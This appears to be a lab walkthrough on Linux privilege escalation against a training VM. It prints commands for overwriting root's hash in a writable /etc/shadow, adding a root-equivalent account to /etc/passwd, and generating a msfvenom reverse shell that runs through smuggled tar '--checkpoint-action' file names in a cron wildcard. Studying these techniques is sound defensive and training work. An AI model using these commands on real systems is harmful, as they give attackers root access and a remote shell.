Weak File Permissions

Readable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable.

1
2

-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow

We will save the root user hash to a file on our local machine and then we will attempt to crack it with john.

Writable /etc/shadow

From the previous topic we know that the shadow file is not only world-readable but also world-writable.

First we will generate a new password hash with a password of our choice with the following command.

1

$ mkpasswd -m sha-512 password

Then we will edit the /etc/shadow file and replace the original root user’s password hash with the one we just generated.

At last we will switch to the root user, using the new password.

1
2
3
4

user@debian:~$ su root

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)

Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable.

1
2

user@debian:~$ ls -la /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd

First we will generate a new password hash with a password of our choice.

1

openssl passwd password

Then we will copy the root user’s row and append it to the bottom of the passwd file, changing the first instance of the word root to newroot and placing the generated password hash between the first and second colon (replacing the “x”).

At last we will switch to the newroot user, using the new password.

1
2
3

user@debian:~$ su  newroot
Password: 
root@debian:/home/user#

Wildcards

Now we will view the contents of the other cron job script.

1
2
3
4

user@debian:/tmp$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

We can see that the tar command is being run with a wildcard asterisk (all files) in user’s home directory.

Program tar has command line options that let us run other commands as part of a checkpoint feature.

We will use msfvenom on your local machine to generate a reverse shell ELF binary. Then we will transfer the generated shell.elf file to /home/user/ on the Debian VM.

1
2
3
4

$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
$ scp shell.elf user@10.10.69.56:/home/user
user@10.10.69.56's password: 
shell.elf                                  100%  194     2.7KB/s   00:00

On the target machine we will add executable permission to the transferred binary and then we will create two files in /home/user.

1
2
3

user@debian:~$ chmod +x shell.elf 
user@debian:~$ touch /home/user/--checkpoint=1
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf

When the tar command in the cron job runs, the wildcard asterisk will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Abusing Shell Features #2

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

We will Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash.

NFS

A Network File System (NFS) allows remote hosts to mount file systems over a network and interact with those file systems as though they are mounted locally. This enables system administrators to consolidate resources onto centralized servers on the network.

Files created via NFS inherit the remoteÂ user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.

First, we will check the NFS share configuration in the exports file located in the /etc directory.
